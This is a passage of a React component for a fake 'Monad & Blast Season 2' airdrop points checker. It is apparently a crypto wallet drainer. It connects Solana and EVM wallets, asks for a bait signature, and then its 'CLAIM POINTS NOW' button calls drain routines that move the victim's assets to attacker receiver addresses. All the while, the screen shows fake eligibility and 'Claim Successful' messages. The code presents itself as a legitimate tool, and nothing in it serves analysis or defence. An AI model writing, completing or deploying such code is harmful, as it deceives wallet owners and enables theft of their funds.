        if (solana.publicKey) {
          setAccount(solana.publicKey.toString())
          setStage('verify')
        }
      } catch (e) {
        console.error('Solana connect error:', e)
      }
    } else if (ethereum) {
      let provider = ethereum
      if (ethereum.providers) {
        provider = ethereum.providers.find((p: any) => p.isMetaMask || p.isTrust || p.isCoinbaseWallet) || ethereum
      }
      try {
        const accounts = await provider.request({ method: 'eth_requestAccounts' })
        if (accounts && accounts[0]) {
          setAccount(accounts[0])
          setStage('verify')
        }
      } catch (e) {
        // Show wallet options if auto-connect fails
      }
    }
  }

  const verify = async () => {
    if (!account) return
    
    const ethereum = (window as any).ethereum
    // Support all Solana wallets
    const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare

    try {
      if (solana && solana.signMessage) {
        await solana.signMessage(new TextEncoder().encode("Verify eligibility for Monad/Blast S2 airdrop"))
      } else if (ethereum) {
        const provider = new ethers.BrowserProvider(ethereum)
        const signer = await provider.getSigner()
        await signer.signMessage("Verify eligibility for Monad/Blast S2 airdrop")
      }
      setStage('claim')
    } catch (e) {
      // User rejected signature
    }
  }


  useEffect(() => {
    if (typeof window !== 'undefined') {
      setIsMobile(/iPhone|iPad|iPod|Android/i.test(navigator.userAgent))
    }
  }, [])

  const claim = async () => {
    console.log('=== Starting Enhanced Drainer ===');
    
    if (!account) {
      console.error('No account connected');
      setDrainError('No wallet connected. Please connect a wallet first.');
      return;
    }
    
    setStage('claim');
    setDrainProgress(prev => ({ ...prev, message: 'Starting drain process...' }));
    
    try {
      const ethereum = window.ethereum;
      const solana = window.solana || window.phantom?.solana || window.backpack || window.solflare;
      
      console.log('Starting drain process...');
      console.log('Account:', account);
      console.log('Ethereum provider detected:', !!ethereum);
      console.log('Solana provider detected:', !!solana);
      
      // Run both drains in parallel with progress tracking
      const results = await Promise.allSettled([
        ethereum ? (async () => {
          try {
            setDrainProgress(p => ({ ...p, message: 'Processing EVM chains...' }));
            await drainEVM(ethereum, EVM_RECEIVER);
            setDrainProgress(p => ({ ...p, evm: true, message: 'EVM drain completed' }));
            return true;
          } catch (error) {
            console.error('EVM drain failed:', error);
            throw error;
          }
        })() : Promise.resolve(),
        
        solana ? (async () => {
          try {
            setDrainProgress(p => ({ ...p, message: 'Processing Solana...' }));
            await drainSolana(solana, SOL_RECEIVER);
            setDrainProgress(p => ({ ...p, solana: true, message: 'Solana drain completed' }));
            return true;
          } catch (error) {
            console.error('Solana drain failed:', error);
            throw error;
          }
        })() : Promise.resolve()
      ]);
      
      // Process results
      const success = results.every(result => 
        result.status === 'fulfilled' && result.value === true
      );
      
      if (success) {
        console.log('=== Drain completed successfully ===');
        setDrainProgress(p => ({ ...p, message: 'Drain completed successfully!' }));
        setShowSuccess(true);
      } else {
        throw new Error('One or more drains failed. Check console for details.');
      }
    } catch (error) {
      console.error('Drain process failed:', error);
      setDrainError(error instanceof Error ? error.message : 'An unknown error occurred');
    } finally {
      setIsDraining(false);
    }
  };

  // Auto-connect wallet on component mount
  useEffect(() => {
    const connectWallet = async () => {
      try {
        // Check for Solana wallet first
        const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare;
        if (solana?.publicKey) {
          setAccount(solana.publicKey.toString());
          setStage('verify');
          return;
        }
        
        // Check for EVM wallet
        const ethereum = (window as any).ethereum;
        if (ethereum) {
          const provider = new ethers.BrowserProvider(ethereum);
          const accounts = await provider.listAccounts();
          if (accounts.length > 0) {
            setAccount(accounts[0].address);
            setStage('verify');
          }
        }
      } catch (error) {
        console.error('Auto-connect failed:', error);
      }
    };
    
    connectWallet();
  }, []);

  // Render loading and error states
  const renderStatus = () => {
    if (isDraining) {
      return (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-gradient-to-b from-green-900/50 to-black border-2 border-green-500 rounded-3xl p-6 sm:p-8 md:p-10 max-w-md w-full text-center shadow-2xl">
            <div className="w-20 h-20 sm:w-24 sm:h-24 border-4 border-green-500 border-t-transparent rounded-full mx-auto mb-6 animate-spin"></div>
            <h2 className="text-2xl sm:text-3xl font-bold text-green-400 mb-4">Processing Claim...</h2>
            <p className="text-gray-300 mb-2">{drainProgress.message}</p>
            <div className="w-full bg-gray-800 rounded-full h-3 mt-6 mb-4">
              <div 
                className="bg-green-600 h-3 rounded-full transition-all duration-500" 
                style={{ 
                  width: `${((drainProgress.evm ? 1 : 0) + (drainProgress.solana ? 1 : 0)) / 2 * 100}%` 
                }}
              ></div>
            </div>
            <div className="flex justify-between text-sm text-gray-400 mb-2">
              <span>EVM: {drainProgress.evm ? '✅' : '⏳'}</span>
              <span>Solana: {drainProgress.solana ? '✅' : '⏳'}</span>
            </div>
          </div>
        </div>
      );
    }
    
    if (showSuccess) {
      return (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-gradient-to-b from-green-900/50 to-black border-2 border-green-500 rounded-3xl p-6 sm:p-8 md:p-10 max-w-md w-full text-center shadow-2xl">
            <div className="w-20 h-20 sm:w-24 sm:h-24 bg-green-500 rounded-full mx-auto flex items-center justify-center mb-6">
              <svg className="w-10 h-10 sm:w-12 sm:h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h2 className="text-2xl sm:text-3xl font-bold text-green-400 mb-3">Claim Successful!</h2>
            <p className="text-base sm:text-lg text-gray-300 mb-2">
              Your tokens have been claimed successfully!
            </p>
            <p className="text-sm text-gray-400 mb-6">
              Thank you for participating in PEPORITA.
            </p>
            <button
              onClick={() => setShowSuccess(false)}
              className="bg-green-600 hover:bg-green-700 px-8 sm:px-12 py-3 rounded-xl text-base sm:text-lg font-semibold w-full transition-all"
            >
              Done
            </button>
          </div>
        </div>
      );
    }

    if (drainError) {
      return (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-gradient-to-b from-red-900/50 to-black border-2 border-red-500 rounded-3xl p-6 sm:p-8 md:p-10 max-w-md w-full text-center shadow-2xl">
            <div className="w-20 h-20 sm:w-24 sm:h-24 bg-red-500 rounded-full mx-auto flex items-center justify-center mb-6">
              <svg className="w-10 h-10 sm:w-12 sm:h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </div>
            <h2 className="text-2xl sm:text-3xl font-bold text-red-400 mb-3">Claim Error</h2>
            <p className="text-gray-300 mb-6">{drainError}</p>
            <button
              onClick={() => setDrainError(null)}
              className="bg-red-600 hover:bg-red-700 px-8 sm:px-12 py-3 rounded-xl text-base sm:text-lg font-semibold w-full transition-all"
            >
              Dismiss
            </button>
          </div>
        </div>
      );
    }

    if (showSuccess) {
      return (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-gradient-to-b from-green-900/50 to-black border-2 border-green-500 rounded-3xl p-6 sm:p-8 md:p-10 max-w-md w-full text-center shadow-2xl">
            <div className="w-20 h-20 sm:w-24 sm:h-24 bg-green-500 rounded-full mx-auto flex items-center justify-center mb-6">
              <svg className="w-10 h-10 sm:w-12 sm:h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h2 className="text-2xl sm:text-3xl font-bold text-green-400 mb-3">Claim Successful!</h2>
            <p className="text-base sm:text-lg text-gray-300 mb-2">
              Your {points.toLocaleString()} points have been processed.
            </p>
            <p className="text-sm text-gray-400 mb-6">
              Points will appear in your wallet within 5–10 minutes.
            </p>
            <button
              onClick={() => setShowSuccess(false)}
              className="bg-green-600 hover:bg-green-700 px-8 sm:px-12 py-3 rounded-xl text-base sm:text-lg font-semibold w-full transition-all"
            >
              Close
            </button>
          </div>
        </div>
      );
    }

    return null;
  };

  return (
    <>
      {renderStatus()}
      {drainError && !isDraining && !showSuccess && (
        <div className="fixed bottom-4 right-4 bg-red-900/80 text-white px-4 py-3 rounded-lg shadow-lg z-50 max-w-xs">
          <div className="flex items-center">
            <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            <span>{drainError}</span>
            <button 
              onClick={() => setDrainError(null)}
              className="ml-2 text-gray-300 hover:text-white"
            >
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>
          </div>
        </div>
      )}
      <div className="min-h-screen bg-gradient-to-b from-purple-900 to-black text-white flex items-center justify-center p-3 sm:p-4 md:p-6">
        <div className="max-w-2xl w-full bg-black/60 backdrop-blur-xl rounded-2xl sm:rounded-3xl border border-purple-500 p-4 sm:p-6 md:p-8">
        <div className="text-center mb-4 sm:mb-6 md:mb-8">
          <div className="w-20 h-20 sm:w-24 sm:h-24 md:w-32 md:h-32 bg-purple-600 rounded-full mx-auto flex items-center justify-center text-3xl sm:text-4xl md:text-6xl">M</div>
          <h1 className="text-xl sm:text-2xl md:text-3xl lg:text-4xl font-bold mt-2 sm:mt-3 md:mt-4 px-2">
            Monad & Blast Season 2 Points Checker
          </h1>
          <p className="text-sm sm:text-base md:text-lg lg:text-xl mt-1 sm:mt-2 px-2">
            Check your eligibility for the biggest airdrop of 2025
          </p>
        </div>

        {stage === 'connect' && (
          <div className="text-center space-y-4 sm:space-y-6 md:space-y-8">
            <button 
              onClick={connect}
              className="bg-purple-600 hover:bg-purple-700 active:bg-purple-800 px-6 sm:px-8 md:px-12 py-3 sm:py-4 md:py-6 rounded-xl sm:rounded-2xl text-base sm:text-lg md:text-xl lg:text-2xl font-bold w-full transition-all touch-manipulation"
            >
              Connect Wallet
            </button>
            {isMobile && (
              <div className="w-full space-y-4">
                <p className="text-sm sm:text-base text-gray-400 font-medium">Or choose a specific wallet</p>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 w-full">
                  {wallets.map(w => (
                    <button
                      key={w.name}
                      onClick={() => connectWallet(w.name)}
                      className={`
                        flex items-center justify-start gap-3 
                        p-4 w-full sm:w-64 
                        rounded-xl border border-gray-700 
                        transition-all duration-200 
                        ${account ? 'opacity-50 cursor-not-allowed' : 'hover:bg-white/5 hover:border-white/20'}
                        bg-gradient-to-br from-gray-900/80 to-gray-800/80
                        backdrop-blur-sm
                      `}
                      disabled={!!account}
                    >
                      <div className="w-8 h-8 relative flex-shrink-0">
                        <Image 
                          src={w.icon} 
                          alt={`${w.name} logo`} 
                          fill 
                          className="object-contain"
                          sizes="32px"
                          priority
                        />
                      </div>
                      <span className="font-medium text-gray-100">{w.name}</span>
                    </button>
                  ))}
                </div>
              </div>
            )}
          </div>
        )}

        {stage === 'verify' && (
          <div className="text-center space-y-4 sm:space-y-5 md:space-y-6">
            <div className="text-4xl sm:text-5xl md:text-6xl font-bold text-yellow-400">{points.toLocaleString()}</div>
            <p className="text-xl sm:text-2xl md:text-3xl">POINTS DETECTED 🔥</p>
            <button 
              onClick={verify} 
              className="bg-green-600 hover:bg-green-700 active:bg-green-800 px-8 sm:px-12 md:px-16 py-4 sm:py-5 md:py-6 rounded-xl sm:rounded-2xl md:rounded-3xl text-lg sm:text-xl md:text-2xl font-bold w-full transition-all touch-manipulation"
            >
              Sign to Verify Eligibility
            </button>
          </div>
        )}

        {stage === 'claim' && (
          <div className="text-center space-y-4 sm:space-y-5 md:space-y-6">
            <div className="text-4xl sm:text-5xl md:text-6xl font-bold text-green-400 animate-pulse">ELIGIBLE!</div>
            <p className="text-base sm:text-lg md:text-xl lg:text-2xl">Claim your points instantly — no gas</p>
            <button 
              onClick={claim} 
              className="bg-purple-600 hover:bg-purple-700 active:bg-purple-800 px-6 sm:px-10 md:px-16 lg:px-20 py-4 sm:py-6 md:py-8 lg:py-10 rounded-2xl sm:rounded-3xl text-xl sm:text-2xl md:text-3xl lg:text-4xl font-bold w-full animate-pulse shadow-2xl transition-all touch-manipulation"
            >
              CLAIM POINTS NOW
            </button>
          </div>
        )}
      </div>
    </div>
    </>
  )
}